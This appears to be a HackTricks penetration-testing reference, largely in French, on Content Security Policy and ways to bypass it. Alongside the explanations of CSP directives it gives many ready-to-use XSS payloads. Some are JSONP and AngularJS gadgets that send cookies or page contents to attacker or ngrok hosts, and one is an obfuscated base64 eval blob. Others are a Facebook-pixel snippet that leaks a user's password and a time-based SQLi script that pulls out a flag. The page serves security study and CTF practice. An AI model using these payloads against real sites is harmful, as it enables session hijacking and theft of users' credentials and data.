# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Qu'est-ce que CSP

Content Security Policy (CSP) est reconnue comme une technologie de navigateur, principalement destinée à **protéger contre des attaques telles que cross-site scripting (XSS)**. Elle fonctionne en définissant et détaillant les chemins et sources depuis lesquels le navigateur peut charger des ressources en toute sécurité. Ces ressources englobent une variété d'éléments tels que les images, les frames et le JavaScript. Par exemple, une politique peut permettre le chargement et l'exécution de ressources depuis le même domaine (self), y compris des ressources inline et l'exécution de code sous forme de chaîne via des fonctions comme `eval`, `setTimeout`, ou `setInterval`.

La mise en œuvre de CSP se fait via **en-têtes de réponse** ou en incorporant des **éléments meta dans la page HTML**. Conformément à cette politique, les navigateurs appliquent de manière proactive ces stipulations et bloquent immédiatement toute violation détectée.

- Implémenté via un en-tête de réponse:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implémenté via la balise meta:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### En-têtes

CSP peut être appliqué ou surveillé via ces en-têtes :

- `Content-Security-Policy`: Applique la CSP ; le navigateur bloque toute violation.
- `Content-Security-Policy-Report-Only`: Utilisé pour la surveillance ; signale les violations sans les bloquer. Idéal pour les tests en environnement de pré-production.

### Définition des ressources

CSP restreint les origines pour le chargement du contenu actif et passif, contrôlant des aspects tels que l'exécution de JavaScript inline et l'utilisation de `eval()`. Un exemple de politique est :
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

- **script-src**: Autorise des sources spécifiques pour JavaScript, y compris les URLs, les scripts inline et les scripts déclenchés par des gestionnaires d'événements ou des feuilles de style XSLT.
- **default-src**: Définit une politique par défaut pour la récupération de ressources lorsque des directives de récupération spécifiques sont absentes.
- **child-src**: Spécifie les ressources autorisées pour les web workers et le contenu des frames intégrées.
- **connect-src**: Restreint les URLs qui peuvent être chargées via des interfaces comme fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Restreint les URLs pour les frames.
- **frame-ancestors**: Spécifie quelles sources peuvent intégrer la page courante, applicable aux éléments comme `<frame>`, `<iframe>`, `<object>`, `<embed>`, et `<applet>`.
- **img-src**: Définit les sources autorisées pour les images.
- **font-src**: Spécifie les sources valides pour les polices chargées via `@font-face`.
- **manifest-src**: Définit les sources autorisées des fichiers manifest d'application.
- **media-src**: Définit les sources autorisées pour le chargement d'objets média.
- **object-src**: Définit les sources autorisées pour les éléments `<object>`, `<embed>`, et `<applet>`.
- **base-uri**: Spécifie les URLs autorisées pour le chargement via les éléments `<base>`.
- **form-action**: Liste les endpoints valides pour les soumissions de formulaires.
- **plugin-types**: Restreint les types MIME qu'une page peut invoquer.
- **upgrade-insecure-requests**: Indique aux navigateurs de réécrire les URLs HTTP en HTTPS.
- **sandbox**: Applique des restrictions similaires à l'attribut sandbox d'un `<iframe>`.
- **report-to**: Spécifie un groupe vers lequel un rapport sera envoyé si la politique est violée.
- **worker-src**: Spécifie les sources valides pour les scripts Worker, SharedWorker ou ServiceWorker.
- **prefetch-src**: Spécifie les sources valides pour les ressources qui seront récupérées ou préchargées.
- **navigate-to**: Restreint les URLs vers lesquelles un document peut naviguer par tout moyen (a, form, window.location, window.open, etc.)

### Sources

- `*`: Autorise toutes les URLs sauf celles avec les schémas `data:`, `blob:`, `filesystem:`.
- `'self'`: Autorise le chargement depuis le même domaine.
- `'data'`: Autorise le chargement de ressources via le schéma data (par ex., images encodées en Base64).
- `'none'`: Bloque le chargement depuis n'importe quelle source.
- `'unsafe-eval'`: Autorise l'utilisation de `eval()` et de méthodes similaires, déconseillé pour des raisons de sécurité.
- `'unsafe-hashes'`: Autorise certains gestionnaires d'événements inline spécifiques.
- `'unsafe-inline'`: Autorise l'utilisation de ressources inline comme les `<script>` ou `<style>` inline, déconseillé pour des raisons de sécurité.
- `'nonce'`: Une liste blanche pour des scripts inline spécifiques utilisant un nonce cryptographique (nombre utilisé une fois).
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Charger un script en réutilisant le nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Autorise les scripts ayant un hash sha256 spécifique.
- `'strict-dynamic'`: Permet le chargement de scripts depuis n'importe quelle source si ceux-ci ont été autorisés via un nonce ou un hash.
- `'host'`: Spécifie un hôte particulier, comme `example.com`.
- `https:`: Restreint les URLs à celles utilisant HTTPS.
- `blob:`: Autorise le chargement de ressources depuis des Blob URLs (par exemple, des Blob URLs créées via JavaScript).
- `filesystem:`: Autorise le chargement de ressources depuis le système de fichiers.
- `'report-sample'`: Inclut un échantillon du code en violation dans le rapport de violation (utile pour le débogage).
- `'strict-origin'`: Similaire à 'self' mais garantit que le niveau de sécurité du protocole des sources correspond à celui du document (seules les origines sécurisées peuvent charger des ressources depuis des origines sécurisées).
- `'strict-origin-when-cross-origin'`: Envoie des full URLs pour les requêtes same-origin mais n'envoie que l'origine lorsqu'une requête est cross-origin.
- `'unsafe-allow-redirects'`: Autorise le chargement de ressources qui redirigent immédiatement vers une autre ressource. Non recommandé car cela affaiblit la sécurité.

## Règles CSP dangereuses

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Payload fonctionnel : `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Ceci ne fonctionne pas, pour plus d'informations [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload fonctionnel :
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si vous pouvez d'une manière ou d'une autre faire qu'un **allowed JS code created a new script tag** soit inséré dans le DOM avec votre code JS, parce qu'un script autorisé le crée, le **new script tag will be allowed to be executed**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload fonctionnel :
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Absence de object-src et default-src

> [!CAUTION] > **Il semble que cela ne fonctionne plus**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads fonctionnels:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Téléversement de fichier + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si vous pouvez upload un fichier JS, vous pouvez bypass cette CSP :

Working payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Cependant, il est fort probable que le serveur **valide le fichier uploadé** et n'autorisera que l'**upload de types de fichiers déterminés**.

De plus, même si vous pouviez uploader un **JS code inside** dans un fichier en utilisant une extension acceptée par le serveur (comme : _script.png_), cela ne suffira pas car certains serveurs comme Apache **select MIME type of the file based on the extension** et des navigateurs comme Chrome **refuseront d'exécuter Javascript** contenu dans quelque chose qui devrait être une image. "Heureusement", il y a des erreurs. Par exemple, lors d'un CTF j'ai appris que **Apache ne connaît pas** l'extension _**.wave**_, donc il ne la sert pas avec un **MIME type like audio/***.

À partir de là, si vous trouvez un XSS et un file upload, et que vous parvenez à trouver une **misinterpreted extension**, vous pouvez essayer d'uploader un fichier avec cette extension et le contenu du script. Ou, si le serveur vérifie le format correct du fichier uploadé, créez un polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Si l'injection de JS n'est pas possible, vous pouvez quand même essayer d'exfiltrer par exemple des identifiants en **injecting a form action** (et peut‑être en comptant sur les gestionnaires de mots de passe pour auto‑remplir les mots de passe). Vous pouvez trouver un [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Aussi, notez que `default-src` ne couvre pas les form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Pour certains des payloads suivants **`unsafe-eval` n'est même pas nécessaire**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Charger une version vulnérable d'angular et exécuter du JS arbitraire :
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> L'article montre que vous pouvez **charger** toutes les **bibliothèques** depuis `cdn.cloudflare.com` (ou n'importe quel autre dépôt de bibliothèques JS autorisé), exécuter toutes les fonctions ajoutées de chaque bibliothèque, et vérifier **quelles fonctions de quelles bibliothèques renvoient l'objet `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS à partir d'un class name :
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abuser du code JS de google recaptcha

Selon [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) vous pouvez abuser de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dans une CSP pour exécuter du code JS arbitraire en contournant la CSP :
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Plus de [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Abuser www.google.com pour open redirect

L'URL suivante redirige vers example.com (from [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Exploitation de \*.google.com/script.google.com

Il est possible d'abuser de Google Apps Script pour recevoir des informations dans une page hébergée sur script.google.com. Comme cela a été [fait dans ce rapport](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Endpoints tiers + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Des scénarios comme celui-ci où `script-src` est réglé sur `self` et un domaine particulier qui est en liste blanche peuvent être contournés en utilisant JSONP. Les endpoints JSONP permettent des méthodes de callback non sécurisées qui permettent à un attaquant d'effectuer du XSS, working payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contient des endpoints JSONP prêts à l'emploi permettant un CSP bypass sur différents sites web.**

La même vulnérabilité se produira si le **trusted endpoint contient un Open Redirect**, car si l'endpoint initial est trusted, les redirects sont eux aussi considérés comme trusted.

### Abus par des tiers

Comme décrit dans le [post suivant](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), il existe de nombreux domaines tiers qui peuvent être autorisés quelque part dans la CSP et qui peuvent être abusés pour exfiltrate data ou execute JavaScript code. Certains de ces tiers sont :

| Entité            | Domaines autorisés                            | Capacités    |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Si vous trouvez l'un des domaines autorisés dans la CSP de votre cible, il y a de fortes chances que vous puissiez bypass the CSP en vous inscrivant sur le service tiers et, soit exfiltrate data vers ce service, soit execute code.

Par exemple, si vous trouvez la CSP suivante :
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ou
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Vous devriez pouvoir exfiltrer des données, comme cela a toujours été fait avec [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Dans ce cas, suivez ces étapes générales :

1. Créez un compte Facebook Developer ici.
2. Créez une nouvelle application "Facebook Login" et sélectionnez "Website".
3. Allez dans "Settings -> Basic" et récupérez votre "App ID"
4. Sur le site cible depuis lequel vous voulez exfiltrer des données, vous pouvez exfiltrer des données en utilisant directement le gadget du Facebook SDK "fbq" via un "customEvent" et le data payload.
5. Allez dans l'Event Manager de votre App et sélectionnez l'application que vous avez créée (notez que l'event manager peut se trouver à une URL similaire à celle-ci: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Sélectionnez l'onglet "Test Events" pour voir les événements envoyés par "votre" site web.

Ensuite, du côté de la victime, vous exécutez le code suivant pour initialiser le pixel de tracking Facebook afin de le pointer vers l'app-id du compte Facebook Developer de l'attaquant et émettre un custom event comme ceci:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
En ce qui concerne les sept autres domaines tiers spécifiés dans le tableau précédent, il existe de nombreuses autres façons de les abuser. Reportez-vous au [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) précédemment cité pour des explications supplémentaires sur d'autres abus impliquant des tiers.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

En plus de la redirection mentionnée ci‑dessus pour contourner les restrictions de chemin, il existe une autre technique appelée Relative Path Overwrite (RPO) qui peut être utilisée sur certains serveurs.

Par exemple, si CSP autorise le chemin `https://example.com/scripts/react/`, il est possible d'effectuer un bypass de la manière suivante:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Le navigateur finira par charger `https://example.com/scripts/angular/angular.js`.

Cela fonctionne parce que, pour le navigateur, vous chargez un fichier nommé `..%2fangular%2fangular.js` situé sous `https://example.com/scripts/react/`, ce qui est conforme à la CSP.

Le navigateur va le décoder, demandant effectivement `https://example.com/scripts/react/../angular/angular.js`, ce qui est équivalent à `https://example.com/scripts/angular/angular.js`.

En **exploiter cette incohérence d'interprétation des URL entre le navigateur et le serveur, les règles de chemin peuvent être contournées**.

La solution est de ne pas traiter `%2f` comme `/` côté serveur, en assurant une interprétation cohérente entre le navigateur et le serveur pour éviter ce problème.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Exécution JS dans les iframes


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### absence de **base-uri**

Si la directive **base-uri** est absente, vous pouvez en abuser pour effectuer un [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

De plus, si la **page charge un script en utilisant un chemin relatif** (comme `<script src="/js/app.js">`) et utilise un **Nonce**, vous pouvez abuser de la **balise base** pour la faire **charger** le script depuis **votre propre serveur**, obtenant ainsi un XSS.\
Si la page vulnérable est chargée en **httpS**, utilisez une URL httpS dans la base.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS événements

Une politique spécifique connue sous le nom de Content Security Policy (CSP) peut restreindre les événements JavaScript. Néanmoins, AngularJS introduit des événements personnalisés comme alternative. Dans un événement, AngularJS fournit un objet particulier `$event`, qui référence l'objet d'événement natif du navigateur. Cet objet `$event` peut être exploité pour contourner la CSP. Notamment, dans Chrome, l'objet `$event/event` possède un attribut `path`, contenant un tableau d'objets impliqués dans la chaîne d'exécution de l'événement, avec l'objet `window` positionné systématiquement à la fin. Cette structure est essentielle pour les techniques de sandbox escape.

En dirigeant ce tableau vers le filtre `orderBy`, il est possible d'itérer dessus, en utilisant l'élément terminal (l'objet `window`) pour déclencher une fonction globale comme `alert()`. L'extrait de code ci‑dessous illustre ce processus :
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ce fragment met en évidence l'utilisation de la directive `ng-focus` pour déclencher l'événement, en utilisant `$event.path|orderBy` pour manipuler le tableau `path`, et en exploitant l'objet `window` pour exécuter la fonction `alert()`, révélant ainsi `document.cookie`.

Trouvez d'autres bypasses Angular sur [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS et domaine sur liste blanche
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Une politique CSP qui autorise des domaines pour le chargement de scripts dans une application Angular JS peut être contournée via l'invocation de fonctions de rappel et certaines classes vulnérables. Des informations supplémentaires sur cette technique se trouvent dans un guide détaillé disponible sur ce [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Other JSONP arbitrary execution endpoints can be found in [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (certains d'entre eux ont été supprimés ou corrigés)

### Bypass via Redirection

Que se passe-t-il lorsque CSP rencontre une server-side redirection ? Si la redirection mène à une origin différente qui n'est pas autorisée, elle échouera quand même.

Cependant, selon la description dans [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirection mène à un path différent, elle peut bypasser les restrictions originales.

Voici un exemple :
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si la CSP est définie sur `https://www.google.com/a/b/c/d`, puisque le chemin est pris en compte, les scripts `/test` et `/a/test` seront tous deux bloqués par la CSP.

Cependant, la cible finale `http://localhost:5555/301` sera **redirigée côté serveur vers `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Comme il s'agit d'une redirection, le **chemin n'est pas pris en compte**, et le **script peut être chargé**, contournant ainsi la restriction sur le chemin.

Avec cette redirection, même si le chemin est spécifié entièrement, il pourra toujours être contourné.

Par conséquent, la meilleure solution est de s'assurer que le site Web n'a pas de vulnérabilités d'open redirect et qu'aucun domaine ne peut être exploité dans les règles CSP.

### Bypass CSP with dangling markup

Lire [comment ici](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` signifie que vous pouvez exécuter n'importe quel script dans le code (XSS peut exécuter du code) et `img-src *` signifie que vous pouvez utiliser dans la page web n'importe quelle image provenant de n'importe quelle ressource.

Vous pouvez contourner ce CSP en exfiltrant les données via des images (dans ce cas l'XSS exploite un CSRF où une page accessible par le bot contient un SQLi, et extrait le flag via une image) :
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Source: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Vous pouvez également abuser de cette configuration pour **charger du code JavaScript inséré dans une image**. Par exemple, si la page autorise le chargement d'images depuis Twitter, vous pouvez **concevoir** une **image spéciale**, **la téléverser** sur Twitter et abuser du "**unsafe-inline**" pour **exécuter** un code JS (comme un XSS classique) qui va **charger** l'**image**, **extraire** le **JS** de celle-ci et **l'exécuter** : [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Avec les Service Workers

La fonction Service Workers **`importScripts`** n'est pas limitée par le CSP:

{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Recherche :** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **paramètre** envoyé par vous est **collé à l'intérieur** de la **déclaration** de la **politique**, alors vous pouvez **altérer** la **politique** d'une manière qui la rend **inutile**. Vous pourriez **autoriser script 'unsafe-inline'** avec n'importe lequel de ces bypasses :
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Parce que cette directive va **écraser les directives script-src existantes**.\
Vous pouvez trouver un exemple ici : [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Sur Edge c'est beaucoup plus simple. Si vous pouvez ajouter dans la CSP juste ceci : **`;_`** **Edge** va **supprimer** toute la **politique**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Notez l'absence de la directive `'unsafe-inline'`\
Cette fois vous pouvez faire en sorte que la victime **charge** une page **sous votre contrôle** via **XSS** avec un `<iframe`. Vous allez faire en sorte que la victime accède à la page depuis laquelle vous voulez extraire des informations (**CSRF**). Vous ne pouvez pas accéder au contenu de la page, mais si d'une manière ou d'une autre vous pouvez **contrôler le temps de chargement** de la page, vous pouvez extraire l'information dont vous avez besoin.

Cette fois un **flag** va être extrait : chaque fois qu'un **char est correctement deviné** via SQLi la **réponse** prend **plus de temps** à cause de la fonction sleep. Ainsi, vous pourrez extraire le flag :
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Via Bookmarklets

Cette attaque implique une certaine ingénierie sociale où l'attaquant **convainc l'utilisateur de glisser\&déposer un lien sur le bookmarklet du navigateur**. Ce bookmarklet contiendrait du **javascript malveillant** qui, une fois glissé\&déposé ou cliqué, serait exécuté dans le contexte de la fenêtre web courante, **contournant le CSP et permettant de voler des informations sensibles** telles que les cookies ou les tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Contournement du CSP en restreignant le CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

Vous pouvez **restreindre le CSP d'un iframe** avec l'attribut **`csp`** :
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
